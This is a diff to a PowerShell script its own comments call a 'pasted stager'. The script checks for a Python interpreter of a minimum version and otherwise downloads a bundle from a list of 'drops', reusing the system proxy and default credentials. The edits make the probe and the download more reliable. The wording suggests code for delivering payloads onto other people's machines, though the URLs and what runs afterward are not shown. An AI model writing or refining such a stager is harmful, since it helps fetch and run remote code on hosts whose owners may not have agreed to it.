@@ -15,12 +15,20 @@ function sProbe {
         if (-not $sPath) { continue }
         $sCode = 1
         try {
-            # Both streams go to $null rather than being merged with 2>&1:
-            # under 'Stop', a merged stderr line from a native command is a
-            # terminating NativeCommandError in 5.1, so an interpreter above
-            # the floor that printed one warning would be judged unusable and
-            # a bundle fetched onto a host that already had a Python.
-            & $sPath -c 'import sys;sys.exit(0 if sys.version_info[:2] >= (@@MIN_MAJOR@@, @@MIN_MINOR@@) else 1)' 1>$null 2>$null
+            # Only stdout is redirected, and stderr is deliberately left
+            # alone. In Windows PowerShell 5.1 *any* `2>` redirection of a
+            # native command -- `2>&1` and `2>$null` alike -- routes its
+            # stderr lines through the command runtime as NativeCommandError
+            # records, and under 'Stop' the first one throws. The catch below
+            # would then read that as a failed version check, so an
+            # interpreter at or above the floor that printed one warning line
+            # would be judged unusable and a bundle fetched onto a host that
+            # already had a Python. Not redirecting stderr removes the
+            # capture rather than compensating for it; the cost is that the
+            # interpreter's own warnings reach the console, which for a
+            # pasted stager is no cost at all. Adding any `2>` here, however
+            # tidy it looks, puts the defect straight back.
+            & $sPath -c 'import sys;sys.exit(0 if sys.version_info[:2] >= (@@MIN_MAJOR@@, @@MIN_MINOR@@) else 1)' 1>$null
             $sCode = $LASTEXITCODE
         } catch { $sCode = 1 }
         if ($sCode -eq 0) { return $sPath }
@@ -51,10 +59,17 @@ function sFetch($sUrl, $sOut) {
     $sReq = [Net.HttpWebRequest][Net.WebRequest]::Create($sUrl)
     $sReq.Timeout = 600000
     $sReq.ReadWriteTimeout = 600000
-    $sProxy = [Net.WebRequest]::GetSystemWebProxy()
-    if ($sProxy) {
-        $sProxy.Credentials = [Net.CredentialCache]::DefaultCredentials
-        $sReq.Proxy = $sProxy
+    try {
+        $sProxy = [Net.WebRequest]::GetSystemWebProxy()
+        if ($sProxy) {
+            $sProxy.Credentials = [Net.CredentialCache]::DefaultCredentials
+            $sReq.Proxy = $sProxy
+        }
+    } catch {
+        # Its own guard, because the caller turns a throw from here into
+        # "try the next drop": one environment quirk in these three lines
+        # would otherwise cost the whole list rather than one attempt.
+        # The request keeps whatever proxy it was given by default.
     }
     $sRes = $sReq.GetResponse()
     try {
